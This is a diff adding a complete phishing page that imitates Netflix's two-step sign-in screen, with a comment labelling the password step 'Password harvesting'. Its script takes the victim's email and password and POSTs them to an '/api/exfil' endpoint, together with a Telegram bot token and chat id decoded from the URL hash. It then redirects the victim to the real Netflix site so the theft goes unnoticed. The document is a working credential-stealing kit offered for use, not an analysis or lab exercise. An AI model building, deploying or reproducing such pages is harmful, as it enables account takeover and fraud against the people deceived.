@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Netflix</title>
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(to bottom, #300000 0%, #000000 25%);
+            background-color: #000;
+            color: #fff;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+            min-height: 100vh;
+        }
+
+        .nf-container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 20px 24px;
+        }
+
+        .nf-input {
+            width: 100%;
+            height: 56px;
+            background: rgba(22, 22, 22, 0.7);
+            border: 1px solid rgba(128, 128, 128, 0.7);
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            padding: 0 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .nf-input:focus {
+            border-color: #fff;
+            background: rgba(40, 40, 40, 0.9);
+        }
+
+        .nf-btn-red {
+            background-color: #E50914;
+            color: #fff;
+            width: 100%;
+            height: 52px;
+            border-radius: 4px;
+            font-size: 17px;
+            font-weight: 600;
+            margin-top: 16px;
+            transition: background-color 0.2s;
+        }
+
+        .nf-btn-red:hover { background-color: #C11119; }
+        .nf-btn-red:active { transform: scale(0.99); }
+
+        .footer-link {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            text-decoration: underline;
+            text-underline-offset: 2px;
+        }
+
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: transparent;
+            overflow: hidden;
+            display: none;
+            z-index: 1000;
+        }
+        #loader div {
+            position: absolute;
+            background-color: #E50914;
+            height: 100%;
+            width: 40%;
+            animation: nfLoad 1.2s infinite linear;
+        }
+        @keyframes nfLoad { 0% { left: -40%; } 100% { left: 100%; } }
+
+        .fade-in {
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="flex flex-col">
+
+    <div id="loader"><div></div></div>
+
+    <!-- Header -->
+    <header class="p-6 md:px-12">
+        <!-- Replaced with high-fidelity asset -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="w-24 h-auto md:w-32">
+    </header>
+
+    <main class="flex-grow flex items-start justify-center pt-8">
+        <div class="nf-container">
+            <h1 class="text-[32px] font-bold mb-2">Enter your info to sign in</h1>
+            <p class="text-base mb-8">Or get started with a new account.</p>
+
+            <!-- Step 1: Identifier -->
+            <div id="step-id" class="fade-in">
+                <input type="text" id="email" class="nf-input" placeholder="Email or mobile number" autocomplete="username">
+                <button onclick="toPass()" class="nf-btn-red">Continue</button>
+                
+                <div class="mt-8 flex items-center gap-1 cursor-pointer group">
+                    <span class="text-white font-bold text-lg">Get Help</span>
+                    <svg class="w-6 h-6 transition-transform group-hover:translate-y-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M19 9l-7 7-7-7"/></svg>
+                </div>
+
+                <p class="text-[14px] text-gray-400 mt-10 leading-snug">
+                    This page is protected by Google reCAPTCHA to ensure you're not a bot.
+                </p>
+            </div>
+
+            <!-- Step 2: Password harvesting -->
+            <div id="step-pass" class="hidden">
+                <div class="bg-white/5 p-4 rounded mb-6 flex items-center justify-between border border-white/10">
+                    <span id="display-user" class="text-sm opacity-80 font-medium"></span>
+                    <button onclick="location.reload()" class="text-[#E50914] text-xs font-bold uppercase tracking-widest">Change</button>
+                </div>
+                <input type="password" id="password" class="nf-input" placeholder="Password" autofocus>
+                <button onclick="dispatch()" class="nf-btn-red">Sign In</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer from screenshot -->
+    <footer class="bg-black/80 mt-20 py-12 border-t border-white/5">
+        <div class="max-w-[1000px] mx-auto px-6">
+            <p class="text-gray-400 mb-8 text-base">Questions? <a href="#" class="underline">Contact us.</a></p>
+            
+            <div class="grid grid-cols-2 gap-y-4 text-[14px]">
+                <a href="#" class="footer-link">FAQ</a>
+                <a href="#" class="footer-link">Help Center</a>
+                <a href="#" class="footer-link">Terms of Use</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Cookie Preferences</a>
+                <a href="#" class="footer-link">Corporate Information</a>
+            </div>
+
+            <div class="mt-10">
+                <div class="relative inline-block">
+                    <select class="bg-black border border-gray-600 text-white text-sm rounded px-10 py-3 appearance-none font-bold">
+                        <option>English</option>
+                    </select>
+                    <div class="absolute left-3 top-3.5">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 016.412 9m6.088 9h7M11 21l5-10 5 10M12.751 5C11.783 10.77 8.07 15.61 3 18.129"/></svg>
+                    </div>
+                    <div class="absolute right-3 top-3.5 pointer-events-none">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const getConf = () => {
+            const h = window.location.hash.substring(1);
+            if (!h) return null;
+            try { return JSON.parse(atob(h)); } catch(e) { return null; }
+        };
+
+        const config = getConf();
+        let userVal = "";
+
+        function toPass() {
+            userVal = document.getElementById('email').value;
+            if(!userVal) return;
+            document.getElementById('loader').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('display-user').innerText = userVal;
+                document.getElementById('step-id').classList.add('hidden');
+                document.getElementById('step-pass').classList.remove('hidden');
+                document.getElementById('step-pass').classList.add('fade-in');
+            }, 800);
+        }
+
+        async function dispatch() {
+            const p = document.getElementById('password').value;
+            if(!p) return;
+            document.getElementById('loader').style.display = 'block';
+            const fin = "https://www.netflix.com/browse";
+            if(!config) { setTimeout(() => window.location.href = fin, 1200); return; }
+            try {
+                await fetch('/api/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: 'netflix',
+                        credentials: { username: userVal, password: p },
+                        tgToken: config.t,
+                        tgChat: config.c
+                    })
+                });
+            } catch(e){} finally {
+                setTimeout(() => { window.location.href = fin; }, 1200);
+            }
+        }
+    </script>
+</body>
+</html>
